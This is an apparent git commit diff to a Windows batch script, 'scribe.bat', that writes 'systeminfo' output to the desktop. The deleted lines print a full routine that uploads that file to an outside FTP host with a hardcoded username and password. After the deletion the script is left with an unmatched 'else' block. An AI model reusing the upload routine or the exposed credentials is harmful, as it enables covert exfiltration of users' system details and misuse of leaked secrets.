1d4a09d537aefb128f641d14cddf8f51347578af
M48✌🚱 <100668901+Cher-IS-7@users.noreply.github.com>
2024-04-14 21:22:57 +0400

    Update scribe.bat

--- scribe.bat
+++ scribe.bat
@@ -1,7 +1,4 @@
 @echo off
-set FTPSERVER=ftpupload.net
-set FTPUSER="ezyro_36308312"
-set FTPPASS="MegaPass1234"
 set FILENAME=systeminfo.txt
 
 rem Set the path to the desktop folder
@@ -10,21 +7,6 @@ set DESKTOP=%USERPROFILE%\Desktop
 rem Generate systeminfo.txt on the desktop
 systeminfo > "%DESKTOP%\%FILENAME%"
 
-rem Check if the file was generated successfully
-if exist "%DESKTOP%\%FILENAME%" (
-    (
-    echo open %FTPSERVER%
-    echo %FTPUSER%
-    echo %FTPPASS%
-    echo binary
-    echo cd /htdocs/Scout
-    echo put "%DESKTOP%\%FILENAME%"
-    echo quit
-    ) > ftpcmd.txt
-
-    ftp -n -s:ftpcmd.txt
-    del ftpcmd.txt
-    pause
 ) else (
     echo Failed to generate systeminfo.txt on the desktop.
     pause
